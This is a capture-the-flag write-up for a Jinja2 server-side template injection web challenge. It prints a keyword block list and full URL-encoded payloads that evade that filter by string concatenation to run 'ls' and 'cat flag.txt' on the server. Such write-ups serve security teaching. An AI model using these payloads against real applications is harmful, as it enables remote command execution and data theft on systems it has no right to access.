# Name: 5571
- Category: Web

## Description

<img width="627" height="507" alt="image" src="https://github.com/user-attachments/assets/37fa0174-9c8b-41bf-8c82-218b1a5e5e3a" />

## Flag: 
`v1t{n0th1ng_b34ts_url_ssti_9cfac8e6b8978e3f6037d9608fed7767}`

## Solution
Seeing an announcement board on the page, i immediately thought of checking for SSTI, `{{7*'7'*}}` was blocked and gave me the error as 
```
Error: Input blocked: literal token '{' not allowed. Try encoding.
Try encoding blocked tokens
```
So i used `%7B%7B7*7%7D%7D`, and got the output as 49, which confirmed SSTI using jinja2

Checking the view-source for blocked keywords i got 
```
    <!--
    Remember to block potentially dangerous literals in the backend!
    BLOCKED_LITERALS = [
      '{', '}', '__', 'open', 'os', 'subprocess', 'import', 'eval', 'exec',
      'system', 'popen', 'builtins', 'globals', 'locals', 'getattr', 'setattr',
      'class', 'compile', 'inspect'
    ]
    -->
```

After a lot of trial and error i using the payload `{{ request.application.globals.builtins.import('os').popen('id').read() }}` but encoded as `%7B%7Burl_for%7Cattr(%27%27~%27_%27~%27_%27~%27glob%27~%27als%27~%27_%27~%27_%27)%7Cattr(%27%27~%27_%27~%27_%27~%27get%27~%27item%27~%27_%27~%27_%27)(%27%27~%27_%27~%27_%27~%27b%27~%27u%27~%27i%27~%27l%27~%27t%27~%27i%27~%27n%27~%27s%27~%27_%27~%27_%27)%7Cattr(%27%27~%27_%27~%27_%27~%27get%27~%27item%27~%27_%27~%27_%27)(%27%27~%27_%27~%27_%27~%27i%27~%27m%27~%27p%27~%27o%27~%27r%27~%27t%27~%27_%27~%27_%27)(%27o%27~%27s%27)%7Cattr(%27p%27~%27o%27~%27p%27~%27e%27~%27n%27)(%27ls%27)%7Cattr(%27read%27)()%7D%7D` gave me 
```
Rendered result
Dockerfile
README.md
app.py
entrypoint.sh
flag.txt
requirements.txt
templates
```
Next i just ran a command to read `flag.txt`
```
%7B%7Burl_for%7Cattr(%27%27~%27_%27~%27_%27~%27glob%27~%27als%27~%27_%27~%27_%27)%7Cattr(%27%27~%27_%27~%27_%27~%27get%27~%27item%27~%27_%27~%27_%27)(%27%27~%27_%27~%27_%27~%27b%27~%27u%27~%27i%27~%27l%27~%27t%27~%27i%27~%27n%27~%27s%27~%27_%27~%27_%27)%7Cattr(%27%27~%27_%27~%27_%27~%27get%27~%27item%27~%27_%27~%27_%27)(%27%27~%27_%27~%27_%27~%27i%27~%27m%27~%27p%27~%27o%27~%27r%27~%27t%27~%27_%27~%27_%27)(%27o%27~%27s%27)%7Cattr(%27p%27~%27o%27~%27p%27~%27e%27~%27n%27)(%27c%27~%27a%27~%27t%27~%27%20%27~%27f%27~%27l%27~%27a%27~%27g%27~%27.%27~%27t%27~%27x%27~%27t%27)%7Cattr(%27read%27)()%7D%7D
```

